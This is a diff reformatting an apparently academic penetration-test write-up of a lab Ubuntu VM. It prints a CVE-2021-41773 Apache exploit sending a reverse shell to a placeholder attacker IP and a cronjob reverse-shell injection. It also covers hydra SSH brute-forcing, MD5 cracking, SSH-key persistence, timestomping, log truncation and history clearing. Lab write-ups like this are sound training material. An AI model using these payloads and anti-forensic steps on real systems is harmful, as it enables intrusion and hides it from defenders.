@@ -36,29 +36,36 @@ the internal network, professor allowed for further testing including lateral mo
 privilege escalation to demonstrate the impact of an internal network compromise.
 
 # Troubleshooting
-As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
+As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap.
+
 ```sh
-sudo nmap -sV -O -A 192.168.1.0/24
+┌──(kali@kali)-[~]
+└─$ sudo nmap -sV -O -A 192.168.1.0/24
 ```
 Even by trying to locate the machine itself by checking our ARP table, as its directly connected to us:
+
 ```sh
-arp 
+┌──(kali@kali)-[~]
+└─$ arp 
 ```
 Which is very odd, as the machine should have obtained an ip address from the DHCP service...
 
 However, after a while, we figured out that the machine *does* in fact have an ip assigned to it: by booting the machine in recovery mode and enabling the `root` console, we in fact found out that in `/etc/netplan` the machine is set up with a static ip `10.0.2.15`, so *without* DHCP, which goes against the requirements of the assignment.
 ![](images/netplan_trouble.png)
-What we did after is removing every file under `/etc/netplan` and then creating a new file `/etc/rc.local` to enable DHCP with following content
+What we did after is removing every file under `/etc/netplan` and then creating a new file `/etc/rc.local` to enable DHCP with following content.
+
 ```sh
 #!/bin/bash
 dhclient
 exit 0
 ```
-To which we gave `rwx` permissions to root and `r-x` to everyone else
+To which we gave `rwx` permissions to root and `r-x` to everyone else.
+
 ```sh
 chmod 755 /etc/rc.local
 ``` 
 Finally, we enabled and restarted the service to save the configuration (may take a while):
+
 ```sh
 systemctl enable rc-local
 systemctl restart rc-local
@@ -69,7 +76,8 @@ We did **not** tamper with the machine in any other way while in recovery mode, 
 We've started from a very quick `nmap` which revealed the following output:
 
 ```sh
-sudo nmap -sV -A -O 192.168.56.2
+┌──(kali@kali)-[~]
+└─$ sudo nmap -sV -A -O 192.168.56.2
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 03:40 EDT
 Nmap scan report for 192.168.56.2
@@ -123,10 +131,12 @@ As we can see there are a few open services
 # Foothold
 Let's try establishing foothold by leveraging each path individually. We have color coded them to what we thought the paths were like
 
-## 🟢 via FTP
+## via FTP
 As we have already said, above FTP allows for anonymous login, so let's do that:
+
 ```sh
-ftp 192.168.56.2
+┌──(kali@kali)-[~]
+└─$ ftp 192.168.56.2
 
 Connected to 192.168.56.2.
 220 (vsFTPd 3.0.5)
@@ -138,14 +148,16 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp>
 ```
-By executing a quick `ls`, we can notice the presence of a file named `site-credentials.txt`, which we will download 
+By executing a quick `ls`, we can notice the presence of a file named `site-credentials.txt`, which we will download.
+
 ```sh 
 ftp> get site-credentials.txt
 ```
 The file, which landed on `/home/kali`, reports the following:
 
-```txt
-cat site-credentials.txt 
+```sh
+┌──(kali@kali)-[~]
+└─$ cat site-credentials.txt 
 
 In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password. 
 They mentioned a certain MD5 code.
@@ -158,7 +170,8 @@ Very conveniently, there is password hashed for `ftp-user` with MD5, which is a 
 We can use our trusty `JohnTheRipper` to crack the hash (which we will put inside `crack.txt` file) using the `rockyou` wordlist:
 
 ```sh
-sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 
+┌──(kali@kali)-[~]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 
 
 Created directory: /root/.john
 Using default input encoding: UTF-8
@@ -171,13 +184,16 @@ Use the "--show --format=Raw-MD5" options to display all of the cracked password
 Session completed.  
 ```
 Could `ftp-user` be an SSH user of the target machine? Let's try it:
+
 ```sh
-ssh ftp-user@192.168.56.2
+┌──(kali@kali)-[~]
+└─$ ssh ftp-user@192.168.56.2
     football
 
 ftp-user@ubuntulab:~$
 ```
-An unpriviledged shell was obtained: despite being such, we have access to juicy information, such as the mounted disks 
+An unpriviledged shell was obtained: despite being such, we have access to juicy information, such as the mounted disks
+
 ```sh
 ftp-user@ubuntulab:~$ lsblk
 
@@ -194,8 +210,9 @@ sda      8:0    0  5.2G  0 disk
 sr0     11:0    1 1024M  0 rom
 ```
 and how could we miss the `/etc/passwd` file:
+
 ```sh
-...
+[...]
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
@@ -204,15 +221,18 @@ ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
 ```
 Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 
-## 🟠 via SSH 
+## [MED] via SSH 
 Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command
 
 ```sh 
-hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
+┌──(kali@kali)-[~]
+└─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
 ```
 Which will take a long time, otherwise we could go by guessing and try the commonly used `ubuntu` username (even without seeing `/etc/passwd` from the previous path) and bruteforce off of it using the following command:
+
  ```sh
-hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
+┌──(kali@kali)-[~]
+└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -220,29 +240,37 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 [22][ssh] host: 192.168.56.2   login: ubuntu   password: admin@123
 ````
 Both paths eventually lead to being able to SSH directly to the machine using username `ubuntu` and password `admin@123`
+
 ```sh
-ssh ubuntu@192.168.56.2
+┌──(kali@kali)-[~]
+└─$ ssh ubuntu@192.168.56.2
     admin@123
 
 ubuntu@ubuntulab:~$
 ```
 
-## 🔴 via Apache
+## [HRD] via Apache
 From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
+
 ```sh
-sudo nmap -sV -A 192.168.56.2 --vulners -p8080
+┌──(kali@kali)-[~]
+└─$ sudo nmap -sV -A 192.168.56.2 --vulners -p8080
 ```
 Many vulnerabilities show up, but a particular one caught our eye: CVE-2021-41773, which would allow remote code execution via path traversal. 
 
 After opening a listener on any ephemeral port on our attackbox, we managed to get a shell as the user `ftp-user` by executing the following code:
+
  ```sh
-curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
+┌──(kali@kali)-[~]
+└─$ curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
  ```
-Which effectively executes the following `HTTP POST` request 
+Which effectively executes the following `HTTP POST` request.
+
 ```sh 
 POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1 
 ```
-In order for this exploit to work, the server configuration should also contain the following misconfigured directory directive for entire server’s filesystem (or have it missing)
+In order for this exploit to work, the server configuration should also contain the following misconfigured directory directive for entire server’s filesystem (or have it missing).
+
 ```sh
 <Directory />
     Require all granted
@@ -254,6 +282,7 @@ Additionally, the server would need the `mod_cgi` module enabled.
 Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.
 
 We first notice the presence of the `.bash_history` file, let's take a peek:
+
 ```sh
 ftp-user@ubuntulab:~$ cat .bash_history
 ls
@@ -275,7 +304,8 @@ nano ../scripts/health_check.sh
 vi ../scripts/health_check.sh
 less ../scripts/health_check.sh
 ```
-in his `/home` there are some files, maybe useful for privilege escalation later on
+in his `/home` there are some files, maybe useful for privilege escalation later on.
+
 ```sh
 ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
 printenv  printenv.vbs	printenv.wsf  test-cgi
@@ -287,7 +317,7 @@ The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
 We will show below what we've found.
 
 
-## 🟢 via SSH
+## via SSH
 When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
 
 Well, turns out that the aforementioned user has full root privileges.
@@ -302,6 +332,7 @@ User ubuntu may run the following commands on ubuntulab:
     (ALL : ALL) ALL
 ```
 We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
+
 ```sh
 ubuntu@ubuntulab:~$ sudo su
 
@@ -310,8 +341,9 @@ root@ubuntulab:/home/ubuntu#
 ```
 We are aware that this is a very trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
 
-## 🟠 via Cronjob 
+## [MED] via Cronjob 
 By checking the `crontab` file, we noticed a particular:
+
 ```sh
 ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab
 
@@ -331,13 +363,14 @@ This is a clear vulnerability that we can leverage to obtain privilege escalatio
  ```sh
 echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
 ``` 
-Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
+Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener.
+
 ```sh
 nc -lnvp 7777
 ```
 Since the file is executed as root, the shell will be a root shell.
 
-## 🔴 via LXD
+## [HRD] via LXD
 We noticed the presence of `lxd` from `/etc/passwd`, so we tried exploiting it. We could think about mounting the file system with `root` privileges, but it would require to be `sudoer`. Thankfully, the `ubuntu` user is.
 
 ```sh
@@ -350,14 +383,19 @@ root@test:~#
 ```
 # Persistence
 In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
+
 ```sh
-ssh-keygen -t rsa -b 4096
+┌──(kali@kali)-[~]
+└─$ ssh-keygen -t rsa -b 4096
 ```
-Then we transfered the public key `id_rsa.pub` into the machine, we did it with `scp` but there are many ways to do it
+Then we transfered the public key `id_rsa.pub` into the machine, we did it with `scp` but there are many ways to do it.
+
 ```sh
-scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
+┌──(kali@kali)-[~]
+└─$ scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
 ```
-And we added its content into the `authorized_keys` file
+And we added its content into the `authorized_keys` file.
+
 ```sh
 ubuntu@ubuntulab:~$ cat .ssh/id_rsa.pub >> .ssh/authorized_keys 
 ```
@@ -376,6 +414,7 @@ The job would not be complete without a proper cleanup of our traces.
 When we first enumerated the machine, we made some noise with `nmap`, alongside all the SSH connections we did. The first thing we thought about was checking whether there were any logging rules in `iptables`, and if so, removing them.
 
 In our case there were not.
+
 ```sh
 root@ubuntulab:~# iptables -L
 
@@ -390,24 +429,28 @@ target     prot opt source               destination
 ```
 
 ## Restoring files change and access date 
-Before changing the `authorized_keys` file, we save its creation and modification date
+Before changing the `authorized_keys` file, we save its creation and modification date.
+
 ```sh
 stat -c %y authorized_keys > old_mod_time
 stat -c %x authorized_keys > old_acc_time
 ```
-Modify it by adding our public key for persistance, then restoring the two dates like so 
+Modify it by adding our public key for persistance, then restoring the two dates like so:
+
 ```sh
 touch -d "$(cat old_mod_time)" authorized_keys
 touch -a "$(cat old_acc_time)" authorized_keys
 ```
-And finally every file created in doing so, including `id_rsa.pub` which we put before with `scp`
+And finally every file created in doing so, including `id_rsa.pub` which we put before with `scp`.
+
 ```sh
 rm old_mod_time old_acc_time id_rsa.pub
 ```
 We can also use this method to carefully restore every access and change date, if we really wanted to be stealthy.
 
 ## Clearing the logs
-Then we cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely (as it would raise more concerns victim-side), but to just empty them out
+Then we cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely (as it would raise more concerns victim-side), but to just empty them out.
+
 ```sh
 truncate -s 0 /var/log/auth.log
 truncate -s 0 /var/log/cron.log
@@ -417,6 +460,7 @@ The most stealthy approach would be to carefully remove every time anything rela
 
 ## Removing bash histories
 Finally, we remove any last trace by clearing traces on `history` from **every user** so that all the commands we issued will not be seen.
+
 ```sh
 history -c && history -w
 ```
